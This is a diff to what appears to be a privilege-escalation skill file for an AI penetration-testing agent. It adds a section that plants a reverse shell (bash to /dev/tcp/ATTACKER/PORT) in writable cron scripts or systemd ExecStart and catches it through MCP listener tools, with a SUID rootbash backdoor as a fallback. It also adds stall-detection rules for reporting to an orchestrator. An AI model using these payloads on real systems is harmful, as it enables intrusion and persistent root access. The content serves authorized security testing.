@@ -637,6 +637,29 @@ cat /etc/anacrontab 2>/dev/null
 
 ## Step 8: Escalate or Pivot
 
+### Reverse Shell via MCP
+
+When cron/service abuse achieves code execution as root, **catch the escalated
+shell via the MCP shell-server** rather than polling for SUID bash or waiting
+on a local listener. Cron and service payloads execute asynchronously -- a
+reverse shell lets you catch the callback the moment the job fires.
+
+1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
+2. Write a reverse shell into the cron job or service payload:
+   ```bash
+   # Writable cron script:
+   echo '#!/bin/bash
+   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' > /path/to/cron_script.sh
+   # Or inject into systemd ExecStart:
+   ExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Verify the new privilege level with `send_command(session_id=..., command="id")`
+
+If the target lacks outbound connectivity, use the SUID bash approach
+(`cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash`) as the cron/service
+payload and access it through an existing shell session.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
@@ -660,6 +683,45 @@ After obtaining root:
 
 When routing, pass along: hostname, escalation method used, current access level,
 credentials obtained, current mode.
+
+## Stall Detection
+
+If you have spent **5 or more tool-calling rounds** on the same failure with
+no meaningful progress — same error, no new information, no change in output
+— **stop**.
+
+**What counts as progress:**
+- Trying a variant or alternative **documented in this skill**
+- Adjusting syntax, flags, or parameters per the Troubleshooting section
+- Gaining new diagnostic information (different error, partial success)
+
+**What does NOT count as progress:**
+- Writing custom exploit code not provided in this skill
+- Inventing workarounds using techniques from other domains
+- Retrying the same command with trivially different input
+- Compiling or transferring tools not mentioned in this skill
+
+If you find yourself writing code that isn't in this skill, you have left
+methodology. That is a stall.
+
+Do not loop. Work through failures systematically:
+1. Try each variant or alternative **once**
+2. Check the Troubleshooting section for known fixes
+3. If nothing works after 5 rounds, you are stalled
+
+**When stalled, return to the orchestrator immediately with:**
+- What was attempted (commands, variants, alternatives tried)
+- What failed and why (error messages, empty responses, timeouts)
+- Assessment: **blocked** (permanent — config, patched, missing prereq) or
+  **retry-later** (may work with different context, creds, or access)
+- Update `engagement/state.md` Blocked section before returning
+
+**Mode behavior:**
+- **Guided**: Tell the user you're stalled, present what was tried, and
+  recommend the next best path.
+- **Autonomous**: Update state.md Blocked section, return findings to the
+  orchestrator. Do not retry the same technique — the orchestrator will
+  decide whether to revisit with new context or route elsewhere.
 
 ## Troubleshooting
 
